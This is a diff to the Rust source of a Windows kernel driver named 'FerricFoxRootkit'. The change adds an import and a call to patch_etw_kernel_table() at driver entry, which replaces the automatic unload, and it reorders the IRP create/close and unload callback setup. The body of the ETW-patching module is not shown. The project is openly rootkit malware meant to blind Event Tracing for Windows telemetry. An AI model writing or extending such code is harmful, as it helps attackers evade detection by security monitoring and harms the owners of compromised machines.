@@ -7,6 +7,7 @@ extern crate wdk_panic;
 use core::{iter::once, ptr::null_mut};
 
 use alloc::vec::Vec;
+use etw::patch_etw_kernel_table;
 use wdk_alloc::WdkAllocator;
 #[global_allocator]
 static GLOBAL_ALLOCATOR: WdkAllocator = WdkAllocator;
@@ -21,6 +22,8 @@ use wdk_sys::{
         IofCompleteRequest, RtlInitUnicodeString,
     },
 };
+
+mod etw;
 
 pub static DOS_DEVICE_NAME: &str = "\\??\\FerricFoxRootkit";
 pub static DRIVER_UM_NAME: &str = "\\Device\\FerricFoxRootkit";
@@ -39,8 +42,7 @@ pub unsafe extern "system" fn driver_entry(
         status
     );
 
-    // Automatic unload
-    driver_exit(driver);
+    patch_etw_kernel_table();
 
     status
 }
@@ -61,6 +63,11 @@ pub unsafe extern "C" fn configure_driver(
 
     // Create the device
     let mut device_object: PDEVICE_OBJECT = null_mut();
+
+    // Configure the drivers general callbacks
+    (unsafe { *driver }).MajorFunction[IRP_MJ_CREATE as usize] = Some(ff_create_close); // todo can authenticate requests coming from x
+    (unsafe { *driver }).MajorFunction[IRP_MJ_CLOSE as usize] = Some(ff_create_close);
+    (unsafe { *driver }).DriverUnload = Some(driver_exit);
 
     let res = unsafe {
         IoCreateDevice(
@@ -88,13 +95,6 @@ pub unsafe extern "C" fn configure_driver(
         driver_exit(driver); // cleanup any resources before returning
         return STATUS_UNSUCCESSFUL;
     }
-
-    //
-    // Configure the drivers general callbacks
-    //
-    (unsafe { *driver }).MajorFunction[IRP_MJ_CREATE as usize] = Some(ff_create_close); // todo can authenticate requests coming from x
-    (unsafe { *driver }).MajorFunction[IRP_MJ_CLOSE as usize] = Some(ff_create_close);
-    (unsafe { *driver }).DriverUnload = Some(driver_exit);
 
     // Specifies the type of buffering that is used by the I/O manager for I/O requests that are sent to the device stack.
     (unsafe { *device_object }).Flags |= DO_BUFFERED_IO;
